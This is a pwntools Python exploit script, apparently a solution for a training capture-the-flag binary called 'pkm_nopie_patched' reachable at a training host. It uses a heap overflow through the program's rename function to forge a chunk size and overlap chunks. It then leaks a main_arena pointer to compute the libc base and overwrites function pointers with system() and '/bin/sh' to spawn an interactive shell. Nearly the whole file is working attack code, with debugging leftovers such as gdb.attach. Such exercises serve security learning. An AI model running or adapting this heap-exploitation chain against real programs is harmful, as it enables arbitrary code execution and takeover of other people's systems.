import time
from pwn import *
import sys

if(len(sys.argv)>1):
	run_local = False
else:
	run_local = True




SIZE=90

if "REMOTE" not in args:
	r= process('./pkm_nopie_patched')
else:
	r = remote("bin.training.jinblack.it",2025)


global pkm_number
pkm_number=0
def alloc0():
	r.recvuntil(b"> ")
	r.sendline(b"0")
	global pkm_number
	pkm_number=pkm_number+1
	return pkm_number-1

def rename0(index,lenght,name):
	print("going")
	r.recvuntil(b"> ")
	r.sendline(b"1")
	r.sendline(b"%d" % index)
	r.sendline(b"%d" % lenght)
	r.sendline(name)

def kill0(index):
	r.recvuntil(b"> ")
	r.sendline(b"2")
	r.recvuntil(b"> ")
	r.sendline(b"%d" % index)
	return r.recv_raw(6)

def print0(index):
	r.recvuntil(b"> ")
	r.sendline(b"4")
	r.recvuntil(b"> ")
	r.sendline(b"%d" % index)
	r.recvuntil(b'Moves:')
	print(r.recvuntil(b'(0)'))

def print1(index):
	r.recvuntil(b"> ")
	r.sendline(b"4")
	r.recvuntil(b"> ")
	r.sendline(b"%d" % index)
	r.recvuntil(b"Name: ")
	tounpack=r.recvuntil(b"\n")[:-1]
	tounpack=tounpack+b'\x00'*2
	if(len(tounpack)==4*6):
		tounpack=tounpack+b'\x00'*2
	print(tounpack)	
	print(u64(tounpack))
	return(tounpack)

def print2(index):
	r.recvuntil(b"> ")
	r.sendline(b"4")
	r.recvuntil(b"> ")
	r.sendline(b"%d" % index)
	tounpack=r.recvuntil(b"Name: ")
	print(tounpack)	
	tounpack=r.recvuntil(b">")
	print(tounpack)	



def write0(index,data):
	r.recvuntil(b"> ")
	r.sendline(b"2")
	r.recvuntil(b"Index: ")
	r.sendline(b"%d" % index)
	r.recvuntil(b"Content: ")
	r.send(data)
	#r.recvuntil(b"Options: ")[:-len("Options:")]


alloc0()  #0
alloc0()  #1
alloc0()  #2
alloc0()  #3
rename0(0,72,b'A'*64)  ##A: TO OVERFLOW
rename0(1,0x208-0x10,b'B'*0x20) #TARGET
alloc0()  #4	       #C: TO MERG:4
#rename0(0,32,b'A'*30)  ##A: TO OVERFLOW

kill0(2)


fake_size=b'\x50'+b'\x02'
poison_flags=b'A'*64+fake_size+b'\x00'*6
rename0(0,72,poison_flags)  ##A: TO OVERFLOW





rename0(1,0x500,b'B'*0x500) #TARGET





gdb.attach(r)
input('wait')



p=b'G'*(256+16)+b'K'*16+p64(0x0000000000402036)+p64(0x0000000000402000)*8
size=128+64+32+32+16+32+32+64+32*5-32-16-16
print(size)
rename0(4,size,p) #TARGET
print0(3)
libc_off=0x3e2c80


main_arena88=u64(print1(0))
libc=main_arena88-libc_off
print("[!] LIBC "+hex(libc))
system=libc+0x4e5f0

p=b'G'*(256)+b'/bin/sh\x00'+b'k'*8+b'K'*16+p64(0x0000000000402036)+p64(0x0000000000402000)*6+p64(system)*1+p64(system)
size=128+64+32+32+16+32+32+64+32*5-32-16-16
print(size)
rename0(4,size,p) #TARGET


#gdb.attach(r,"""b *0x401a4f""")
#input('wait')

r.sendline(b"3")
r.sendline(b"3")
r.sendline(b"0")
r.sendline(b"4")
r.interactive()
